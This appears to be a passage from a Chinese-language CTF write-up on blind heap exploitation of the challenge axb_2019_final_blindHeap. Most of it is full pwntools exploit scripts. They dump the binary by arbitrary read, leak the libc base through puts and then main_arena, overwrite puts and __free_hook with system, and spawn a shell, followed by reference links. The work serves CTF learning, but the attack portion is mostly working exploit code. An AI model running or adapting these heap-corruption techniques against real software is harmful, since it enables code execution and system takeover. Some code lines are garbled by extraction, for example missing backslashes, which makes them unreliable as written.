        sh.recvuntil('Your choice:')
        sh.sendline('6')
        sh.recvuntil('Change your name(1~32):')
        sh.sendline(new_name)
    def get_sh():
        if args['REMOTE']:
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./axb_2019_final_blindHeap")
    def Dump_file():
        had_received_length=0
        file_content=""
        while True:
            try:
                sh = get_sh()
                sh.recvuntil('Enter your name(1~32):')
                sh.send('A' * 0x18 + 'Leak--->')
                Add_shopping_cart(sh,0x150,'Chunk_0',0x8,'Chunk_0')
                sh.recvuntil('Your choice:')
                sh.sendline('3')
                sh.recvuntil('Your choice:')
                sh.sendline('1')
                sh.recvuntil('Leak--->')
                first_chunk_addr=u64(sh.recvuntil(''s').strip(''s').ljust(8,'x00')) - 0x150 - 0x10 - 0x10 - 0x10
                log.success('We leak the first chunk address is '+str(hex(first_chunk_addr)))
                padding = ( 0x100 - (first_chunk_addr & 0xFF) ) - 0x10
                payload = 'A' * padding + p64(0) + p64(0x30) 
                payload += p64(0xC) + p64(0x400000+had_received_length) 
                payload += p64(0xC) + p64(0x400000+had_received_length)
                Display_product(sh,1)
                Modify_product(sh,0,'Chunk_0',payload)
                Change_name(sh,'A' * 0x18 + 'Leak--->')
                Display_product(sh,1)
                sh.recvuntil('commodity's name is ')
                received_data = sh.recvuntil('x0Acommo',timeout=1)[:-6]
                if len(received_data) == 0 :
                    file_content += 'x00'
                    had_received_length += 1
                else :
                    file_content += received_data
                    had_received_length += len(received_data)
                log.info('We have get ' + str(had_received_length) +'byte file!')
                sh.close()
            except:
                log.info('We get ' + str(had_received_length) +' byte file!')
                with open('axb_2019_final_blindHeap_dump','wb') as fout:
                    fout.write(file_content)
                break
                sh.close()
                pass
    # Dump_file()
    sh = get_sh()
    sh.recvuntil('Enter your name(1~32):')
    sh.send('A' * 0x18 + 'Leak--->')
    Add_shopping_cart(sh,0x150,'Chunk_0',0x8,'Chunk_0')
    sh.recvuntil('Your choice:')
    sh.sendline('3')
    sh.recvuntil('Your choice:')
    sh.sendline('1')
    sh.recvuntil('Leak--->')
    first_chunk_addr=u64(sh.recvuntil(''s').strip(''s').ljust(8,'x00')) - 0x150 - 0x10 - 0x10 - 0x10
    log.success('We leak the first chunk address is '+str(hex(first_chunk_addr)))
    padding = ( 0x100 - (first_chunk_addr & 0xFF) ) - 0x10
    payload = 'A' * padding + p64(0) + p64(0x30) 
    payload += p64(0xC) + p64(0x603028) 
    payload += p64(0xC) + p64(0x603018)
    Display_product(sh,1)
    Modify_product(sh,0,'Chunk_0',payload)
    Change_name(sh,'A' * 0x18 + 'Leak--->')
    Display_product(sh,1)
    sh.recvuntil('commodity's name is ')
    puts_addr = u64(sh.recvuntil('x0Acommo')[:-6].ljust(8,'x00'))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    log.success('We get libc base address is ' + str(hex(libc_base)))
    log.success('We get system address is ' + str(hex(system_addr)))
    Add_shopping_cart(sh,0x8,'/bin/shx00',0x8,'/bin/shx00')
    Modify_product(sh,0,p64(puts_addr),p64(system_addr))
    gdb.attach(sh)
    Delete_shopping_cart(sh,just_one,1)
    sh.interactive()
    sh.close()
⚠：经测试，远端开启了PIE+ASLR，导致本思路不再可用，我们使用另外的思路进行攻击。
⚠：经测试，远端文件和本地测试文件不同，当我们调用display函数时不再泄露函数地址。
**泄露main_arena，Leak libc base**
我们还是利用刚才的思路进行任意地址读，但是在此之前，我们需要先在我们所有申请的chunk后方布置一个大小大于`fast_max`(一般是0x80)的chunk。那么当我们释放它后，会将main_arena的内容写进fd域和bk域，由于无法得知程序加载位置，我们也不能泄露文件，也就无从得知文件逻辑（不知道到底main_arena的内容会在name中还是description中），我们可以基于第一个Chunk的地址推知其余Chunk的地址，那么我们直接针对其name和description进行读
顺利泄露，我们可以以此为据计算libc基址，经查阅libc，此libc的main_arena地址为0x3C4B78。
**篡改free_hook**
接下来我们采用改写free_hook的利用方式。
但是我们已经改变了堆结构，无法进行empty (chunk_0)，已经没有可控地址了。
此处我们可以在一开始再次提前布置一个Ctrl_Chunk，我们的Chunk
0，可以对两个任意地址进行读写操作，那么我们可以将main_arena的地址放在第一个地址进行泄露，然后将`Ctrl_Chunk->cart`的`data`域放在第二个地址进行任意写，那么相当于我们又拥有了两个任意地址进行读写操作。那么构造payload改写free_hook即可。
**Final EXP**
    from pwn import *
    all_commodity=1
    just_one=2
    context.log_level='debug'
    context.arch='amd64'
    # file_name=ELF("./")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def Add_shopping_cart(sh,product_descript_size,product_descript,product_name_size,product_name):
        sh.recvuntil('Your choice:')
        sh.sendline('1')
        sh.recvuntil('please tell me the desrcription's size.n')
        sh.sendline(str(product_descript_size))
        sh.recvuntil('please tell me the desrcript of commodity.n')
        sh.sendline(product_descript)
        sh.recvuntil('please tell me the commodity-name's size.n')
        sh.sendline(str(product_name_size))
        sh.recvuntil('please tell me the commodity-name.n')
        sh.sendline(product_name)
    def Modify_product(sh,index,product_name,product_descript):
        sh.recvuntil('Your choice:')
        sh.sendline('2')
        sh.recvuntil('The index is ')
        sh.sendline(str(index))
        sh.recvuntil('please tell me the new commodity's name.n')
        sh.sendline(product_name)
        sh.recvuntil('please tell me the new commodity's desrcription.n')
        sh.sendline(product_descript)
    def Display_product(sh,mode,index=null):
        sh.recvuntil('Your choice:')
        sh.sendline('3')
        sh.recvuntil('Your choice:')
        sh.sendline(str(mode))
        if mode is just_one:
            sh.recvuntil('The index is ')
            sh.sendline(str(index))
    def Buy_shopping_cart(sh):
        sh.recvuntil('Your choice:')
        sh.sendline('4')
    def Delete_shopping_cart(sh,mode,index=null):
        sh.recvuntil('Your choice:')
        sh.sendline('5')
        sh.recvuntil('Your choice:')
        sh.sendline(str(mode))
        if mode is just_one:
            sh.recvuntil('The index is ')
            sh.sendline(str(index))
    def Change_name(sh,new_name):
        sh.recvuntil('Your choice:')
        sh.sendline('6')
        sh.recvuntil('Change your name(1~32):')
        sh.sendline(new_name)
    def get_sh():
        if args['REMOTE']:
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./axb_2019_final_blindHeap")
    sh = get_sh()
    sh.recvuntil('Enter your name(1~32):')
    sh.send('A' * 0x18 + 'Leak--->')
    Add_shopping_cart(sh,0x150,'Chunk_0',0x8,'Chunk_0')
    Add_shopping_cart(sh,0x100,'Chunk_1',0x100,'Chunk_1')
    Add_shopping_cart(sh,0x100,'Chunk_2',0x100,'Chunk_2')
    Add_shopping_cart(sh,0x100,'Chunk_3',0x100,'Chunk_3')
    Add_shopping_cart(sh,0x100,'/bin/shx00',0x100,'/bin/shx00')
    Delete_shopping_cart(sh,just_one,1)
    sh.recvuntil('Your choice:')
    sh.sendline('3')
    sh.recvuntil('Your choice:')
    sh.sendline('1')
    sh.recvuntil('Leak--->')
    first_chunk_cart_addr=u64(sh.recvuntil(''s').strip(''s').ljust(8,'x00'))
    first_chunk_name_addr=first_chunk_cart_addr - 0x10  - 0x10
    first_chunk_desc_addr=first_chunk_name_addr - 0x10  - 0x150
    leak__chunk_desc_addr=first_chunk_cart_addr + 0x20  + 0x10
    leak__chunk_name_addr=leak__chunk_desc_addr + 0x100 + 0x10
    leak__chunk_cart_addr=leak__chunk_name_addr + 0x100 + 0x10
    ctrol_chunk_desc_addr=leak__chunk_cart_addr + 0x20  + 0x10
    ctrol_chunk_name_addr=ctrol_chunk_desc_addr + 0x100 + 0x10
    ctrol_chunk_cart_addr=ctrol_chunk_name_addr + 0x100 + 0x10
    log.success('Chunk_0 -> name        : '+str(hex(first_chunk_name_addr)))
    log.success('Chunk_0 -> description : '+str(hex(first_chunk_desc_addr)))
    log.success('Chunk_0 -> cart        : '+str(hex(first_chunk_cart_addr)))
    log.success('Chunk_1 -> name        : '+str(hex(leak__chunk_name_addr)))
    log.success('Chunk_1 -> description : '+str(hex(leak__chunk_desc_addr)))
    log.success('Chunk_1 -> cart        : '+str(hex(leak__chunk_cart_addr)))
    log.success('Chunk_2 -> name        : '+str(hex(ctrol_chunk_name_addr)))
    log.success('Chunk_2 -> description : '+str(hex(ctrol_chunk_desc_addr)))
    log.success('Chunk_2 -> cart        : '+str(hex(ctrol_chunk_cart_addr)))
    padding = ( 0x100 - (first_chunk_desc_addr & 0xFF) ) - 0x10
    payload = 'A' * padding + p64(0) + p64(0x30) 
    payload += p64(0x20) + p64(leak__chunk_name_addr) 
    payload += p64(0x20) + p64(ctrol_chunk_cart_addr)
    Modify_product(sh,0,'Chunk_0',payload)
    Change_name(sh,'A' * 0x18 + 'Leak--->')
    Display_product(sh,all_commodity)
    sh.recvuntil('commodity's name is ')
    main_arena_addr = u64(sh.recvuntil('x0Acommo')[:-6].ljust(8,'x00'))
    log.success('We get main arena address is ' + str(hex(main_arena_addr)))
    libc_base = main_arena_addr - 0x3C4B78
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    log.success('We get libc base address is ' + str(hex(libc_base)))
    log.success('We get system address is ' + str(hex(system_addr)))
    sh.recvline()
    payload  = p64(0x20) + p64(free_hook) 
    payload += p64(0x20) + p64(free_hook)
    Display_product(sh,all_commodity)
    Modify_product(sh,0,p64(main_arena_addr),payload)
    Display_product(sh,all_commodity)
    Modify_product(sh,2,p64(system_addr),p64(system_addr))
    Delete_shopping_cart(sh,just_one,3)
    sh.interactive()
## 0x06 其他的盲打系列(探测栈溢出)
题目为`GXYCTF`的题目，暂无任何复现环境，因此等待更新。
## 0x07 参考链接
[blind-pwn系列总结+创新](https://xz.aliyun.com/t/6984)
[安洵杯2019 官方Writeup(Re/Pwn/Crypto) – D0g3](https://xz.aliyun.com/t/6912)
[x64 之 __libc_csu_init
通用gadget](https://goldsnow.github.io/2017/03/30/x64%E4%B9%8B__libc_csu_init%E9%80%9A%E7%94%A8gadget/)
[__libc_csu_init函数的通用gadget](https://www.cnblogs.com/Ox9A82/p/5487725.html)
[Blind Return Oriented Programming (BROP) Attack –
攻击原理](https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20\(BROP)
[【CTF攻略】格式化字符串blind pwn详细教程](https://www.anquanke.com/post/id/85731)
[Linux X86 程序启动 – main函数是如何被执行的？](https://luomuxiaoxiao.com/?p=516)